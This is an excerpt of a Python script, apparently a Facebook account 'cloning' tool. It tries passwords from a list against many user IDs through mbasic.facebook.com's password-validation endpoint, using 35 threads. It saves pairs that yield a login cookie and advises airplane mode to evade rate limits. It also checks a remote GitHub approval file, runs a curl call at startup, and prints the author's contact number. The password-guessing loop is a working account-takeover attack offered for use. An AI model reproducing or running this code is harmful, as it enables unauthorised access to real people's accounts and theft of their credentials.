...
from random import randint
r1=requests.get("https://github.com/cyb3rsojib/My-Tools-2.0/blob/main/Aprproved").text
...
if not os.path.isfile('.agents.txt'):
	os.system('curl -L https://github.com/cyb3rsojib')
ct = datetime.now()
n = ct.month
...
def main():
	...
	print('\033[1;32m        ┌─────────────────────────────────┐') 
	print("\033[1;92m\t│\033[1;92mWELLCOME TO MY WORLD     \033[1;92m      │")
	print('\033[1;32m┌────────────────────────────────────────────┐') 
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mSOJIB-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
	...
	def __pler__(self):
		...
		if yan == '':
			...
			print('\033[1;37m[+]\033[1;33m FILE CLONING ONLY OK IDS ')
			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
			print('\033[1;37m[+]\033[1;36mSOJIB PROCESS HAS BEEN STARTED')
			print(50*"\033[1;97m_")
			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
			print(50*"\033[1;97m_")
			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
...
banner = """   
 ...
 |____/ \___/ \___/|___|____/ 
    ...
    [-] AUTHOR    :\033[1;32m MD SOJIB HASSAN
    [-] GITHUB    :\033[1;32m CYB3R SOJIB
    [-] WhatsApp  :\033[1;32m 01879614819
...
def xoshnaw():
	...
	try:
		httpCaht = requests.get("https://wa.link/lj0sdi").text
		if id in httpCaht:
